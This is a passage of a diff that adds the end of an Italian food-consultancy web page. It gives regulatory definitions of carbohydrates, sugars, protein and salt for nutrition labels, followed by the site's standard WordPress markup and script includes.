+<p>«carboidrati»: qualsiasi carboidrato metabolizzato dall’uomo, compresi i polioli;</p>
+<p>«zuccheri»: tutti i monosaccaridi e i disaccaridi presenti in un alimento, esclusi i polioli;</p>
+<p>«proteine»: il contenuto proteico calcolato con la seguente formula: proteine = azoto totale (Kjeldahl) × 6,25;</p>
+<p>«sale»: il contenuto equivalente di sale calcolato mediante la formula: sale = sodio × 2,5.</p>
+</div>
+</div>
+</div>
+                                            </article><!-- .entry -->
+                                                          	                                                							                                 <section class="related-posts clr">
+                                    <h3>Related Posts</h3>
+                                    <ul>
+                                                                                    <li style="padding-left:0;">
+                                                                                        <a href="http://www.ef-consulting.it/dop-doc-docg-igp-stg-e-ic/" title="DOP, DOC, DOCG, IGP, STG e IG ?" rel="bookmark">DOP, DOC, DOCG, IGP, STG e IG ?</a>
+                                            <p>Sono delle semplici sigle che però possono complicarci la vita se non sappiamo leggere l'informazione che il produttore ci vuole&hellip;</p>                                            </li>
+                                                                                    <li style="padding-left:0;">
+                                                                                        <a href="http://www.ef-consulting.it/senza-sodio/" title="Senza sodio?" rel="bookmark">Senza sodio?</a>
+                                            <p>Leggiamo spesso sulle confezioni dei prodotti 'senza sodio' o 'senza sale', ma cosa significa questa dicitura? Significa, secondo il Regolamento&hellip;</p>                                            </li>
+                                                                                    <li style="padding-left:0;">
+                                                                                        <a href="http://www.ef-consulting.it/senza-calorie/" title="Senza calorie?" rel="bookmark">Senza calorie?</a>
+                                            <p>Quando sentiamo parlare di un prodotto senza calorie cosa significa? Ecco il riferimento normativo al claim 'senza calorie' Regolamento (CE)&hellip;</p>                                            </li>
+                                                                            </ul>
+                                 </section>
+                                                                                                         
+
+<section id="comments" class="comments-area ">
+
+	    
+					<div id="respond" class="comment-respond">
+			<h3 id="reply-title" class="comment-reply-title">Lascia un commento <small><a rel="nofollow" id="cancel-comment-reply-link" href="/cosa-sara-obbligatorio-in-una-etichetta-alimentare/#respond" style="display:none;">Annulla risposta</a></small></h3>				<form action="http://www.ef-consulting.it/wp-comments-post.php" method="post" id="commentform" class="comment-form" novalidate>
+					<p class="comment-notes"><span id="email-notes">Il tuo indirizzo email non sarà pubblicato.</span> I campi obbligatori sono contrassegnati <span class="required">*</span></p><p class="comment-form-comment"><label for="comment">Commento</label> <textarea id="comment" name="comment" cols="45" rows="8"  aria-required="true" required="required"></textarea></p><p class="comment-form-author"><label for="author">Nome <span class="required">*</span></label> <input id="author" name="author" type="text" value="" size="30" aria-required='true' required='required' /></p>
+<p class="comment-form-email"><label for="email">Email <span class="required">*</span></label> <input id="email" name="email" type="email" value="" size="30" aria-describedby="email-notes" aria-required='true' required='required' /></p>
+<p class="comment-form-url"><label for="url">Sito web</label> <input id="url" name="url" type="url" value="" size="30" /></p>
+<p class="form-submit"><input name="submit" type="submit" id="submit" class="submit" value="Commento all&#039;articolo" /> <input type='hidden' name='comment_post_ID' value='10231' id='comment_post_ID' />
+<input type='hidden' name='comment_parent' id='comment_parent' value='0' />
+</p>				</form>
+					</div><!-- #respond -->
+		
+</section><!-- #comments -->                                                </div><!-- #content -->
+        </section><!-- #primary -->
+        	</div><!-- .container -->
+
+
+
+    </div><!-- #main-content -->         
+	        <footer id="footer" class="site-footer">
+            <div id="footer-widgets" class="container row clr ">
+                <div class="footer-box span_1_of_4 col col-1">
+                                    </div><!-- .footer-box -->
+                <div class="footer-box span_1_of_4 col col-2">
+                                    </div><!-- .footer-box -->
+                <div class="footer-box span_1_of_4 col  col-3 ">
+                                    </div><!-- .footer-box -->
+                <div class="footer-box span_1_of_4 col  col-4">
+                                    </div><!-- .footer-box -->
+            </div><!-- #footer-widgets -->
+        </footer><!-- #footer -->           
+	         
+    <div id="footer-bottom" class="style-1 clr">
+        <div class="container row clr">
+            <div id="copyright" class="span_10 col clr-margin" role="contentinfo">
+                                    <p><a style="text-align: center;"><span style="color: #452822; font-size: 12px;">Environment and Food Consulting</span></a>
+<a style="text-align: center;"><span style="color: #452822; font-size: 12px;">P.IVA 08722080960   - </span></a>
+
+   Copyright 2017 &middot; <a href="http://www.ef-consulting.it" title="EFConsulting">EFConsulting</a></p>
+                           </div><!-- #copyright -->
+            <div id="footer-social" class="span_14 col">
+               <ul id="social" class="clr"><li class="twitter"><a href="http://www.twitter.com/" title="Follow Us" target="_blank"><img src="http://www.ef-consulting.it/wp-content/themes/wpex-thunder/images/social/twitter.png" alt="Follow Us" /></a></li><li class="facebook"><a href="http://www.facebook.com/" title="Like Us" target="_blank"><img src="http://www.ef-consulting.it/wp-content/themes/wpex-thunder/images/social/facebook.png" alt="Like Us" /></a></li><li class="linkedin"><a href="http://www.linkedin.com/" title="Connect" target="_blank"><img src="http://www.ef-consulting.it/wp-content/themes/wpex-thunder/images/social/linkedin.png" alt="Connect" /></a></li><li class="youtube"><a href="http://www.youtube.com/" title="Our Youtube Channel" target="_blank"><img src="http://www.ef-consulting.it/wp-content/themes/wpex-thunder/images/social/youtube.png" alt="Our Youtube Channel" /></a></li><li class="rss"><a href="http://feeds.feedburner.com/" title="Site Feed" target="_blank"><img src="http://www.ef-consulting.it/wp-content/themes/wpex-thunder/images/social/rss.png" alt="Site Feed" /></a></li></ul><!-- #social -->            </div><!-- #footer-social -->
+        </div><!-- .container -->
+    </div><!-- #footer-bottom -->
+
+</div><!-- #wrap -->
+
+<script type='text/javascript' src='http://www.ef-consulting.it/wp-content/plugins/contact-form-7/includes/js/jquery.form.min.js?ver=3.51.0-2014.06.20'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var _wpcf7 = {"loaderUrl":"http:\/\/www.ef-consulting.it\/wp-content\/plugins\/contact-form-7\/images\/ajax-loader.gif","recaptchaEmpty":"Please verify that you are not a robot.","sending":"Invio..."};
+/* ]]> */
+</script>
+<script type='text/javascript' src='http://www.ef-consulting.it/wp-content/plugins/contact-form-7/includes/js/scripts.js?ver=4.4'></script>
+<script type='text/javascript' src='http://www.ef-consulting.it/wp-content/themes/wpex-thunder/js/retina.js?ver=0.0.2'></script>
+<script type='text/javascript' src='http://www.ef-consulting.it/wp-includes/js/comment-reply.min.js?ver=4.4.10'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var wpexLocalize = {"responsiveMenuText":"Menu"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='http://www.ef-consulting.it/wp-content/themes/wpex-thunder/js/global.js?ver=1.0'></script>
+<script type='text/javascript' src='http://www.ef-consulting.it/wp-includes/js/wp-embed.min.js?ver=4.4.10'></script>
+</body>
+</html>
